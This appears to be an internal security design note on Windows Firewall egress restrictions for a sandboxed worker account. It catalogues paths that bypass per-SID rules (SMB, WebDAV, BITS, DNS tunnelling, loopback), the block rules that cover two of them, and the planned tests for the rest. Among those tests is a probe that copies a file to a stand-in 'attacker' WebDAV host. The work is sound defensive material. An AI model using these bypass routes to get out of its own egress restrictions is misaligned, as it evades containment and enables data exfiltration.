# Network delegation risks (H3, r3, 2026-11-10)

The worker egress rules are per-SID (`-LocalUser` = the worker SID). A per-SID rule only matches connections whose ALE
token is the worker's. Anything the worker can ask a **system component** to fetch on its behalf is made under that
component's identity, not the worker's, and is **not** matched. This is the H3 gap.

## Host facts (read-only, 2026-11-10)

| Service / component | Identity | State on this host | Egress it can make for the worker |
|---|---|---|---|
| SMB redirector (`mrxsmb`) | kernel / `System` | LanmanWorkstation Running | `\\host\share`, TCP 445/139 |
| WebDAV (`WebClient`) | LocalService | **Stopped**, StartType Manual (trigger-start) | `\\host@SSL\DavWWWRoot\…`, HTTP(S) |
| BITS | SYSTEM (shared svchost) | Running | `Start-BitsTransfer` to any URL |
| DNS cache (`Dnscache`) | NETWORK SERVICE | Running | name resolution; DNS-tunnel exfil |
| Loopback listeners | various | n/a | not filtered by Windows Firewall |

All three firewall profiles are Enabled with DefaultOutboundAction = Allow and AllowLocalFirewallRules = True
(so a local Block rule is honoured).

## Per mechanism: prevention or documented, testable restriction

| Mechanism | r3 treatment | How it is tested on the real account |
|---|---|---|
| **SMB redirector** | `05 -HostRules` adds a **global** rule `ELEVARIQ-STG-Host-Block-SMB-Out`: Outbound Block, `Program=System`, TCP, RemotePort 445/139, RemoteAddress = complement of `-LanCidrs`. Global state → separate authorization. | AT-77 (`\\localhost\E$`, `\\127.0.0.1\C$`) and an SMB probe to an external host under the worker token → BLOCK. |
| **WebDAV** | `05 -HostRules` adds `ELEVARIQ-STG-Host-Block-WebClient-Out`: Outbound Block, `Service=WebClient`, to non-LAN. Also: consider leaving WebClient disabled (it is, here). | A `copy x \\attacker@SSL\DavWWWRoot\` probe under the worker token → BLOCK, with WebClient both stopped and (separately) started. |
| **BITS** | **Residual, not yet prevented.** Whether a BITS job started by the worker carries the worker's token through ALE (so the per-SID rule bites) is **unverified**. A global `Service=BITS` block would also stop legitimate Windows Update for the whole machine, so it is not applied blindly. | AT-H3-BITS: `Start-BitsTransfer` to an external URL under the worker token, owner-side verified (did the file arrive?). If it bypasses, add a scoped mitigation then. |
| **DNS** | **Recorded residual.** Resolution goes via Dnscache (NETWORK SERVICE); a per-SID rule cannot stop DNS-tunnel exfil. | AT-73 (UDP 53 direct → BLOCK, so only the system resolver path remains) and AT-78 (DNS-only exfil **documented as a known residual**, never a pass). The real mitigation is the loopback egress proxy enforcing a name allow-list, which is unimplemented. |
| **Loopback** | **Recorded residual.** Windows Firewall does not filter loopback, so the worker can reach any localhost listener. | AT-76: inventory every loopback listener reachable from the worker; the owner reviews each for authentication. Records whether the firewall filters loopback (it does not). |

## Verification added in r3

- `05` and the `06` gate check **`Get-NetFirewallProfile -PolicyStore ActiveStore`**: all profiles Enabled and
  `AllowLocalFirewallRules` true, else fail. A disabled profile or a GPO that ignores local rules would make the worker
  rules inert; r3 catches that.
- `07` reports the WebClient and BITS service state as INFO, and whether the host-level rules are present.

## What r3 does not do

- It does **not** implement the loopback egress proxy with a host-name allow-list. Without it, the worker's allowed
  destinations are **IP ranges**, not host names, so the provider's ranges must be supplied and kept current by the
  owner (`05 -AllowIPv4Cidrs`), and name-based allow-listing does not exist.
- It does **not** verify any of the delegation bypasses are actually blocked — those are the AT probes above, which need
  the real worker account.
- The `-HostRules` global blocks affect the owner too (the owner can also no longer reach non-LAN SMB/WebDAV). That
  trade-off is the owner's to accept; it is why `-HostRules` is off by default and separately authorized.

## Bottom line

Per-SID egress restriction is necessary but not sufficient. r3 names every delegation path, provides an explicit global
block for the two with a clean mechanism (SMB, WebDAV), and records the rest (BITS, DNS, loopback) as residuals with
named real-token acceptance tests. None of these restrictions is claimed effective until those tests pass under
`elv-stg-worker`.
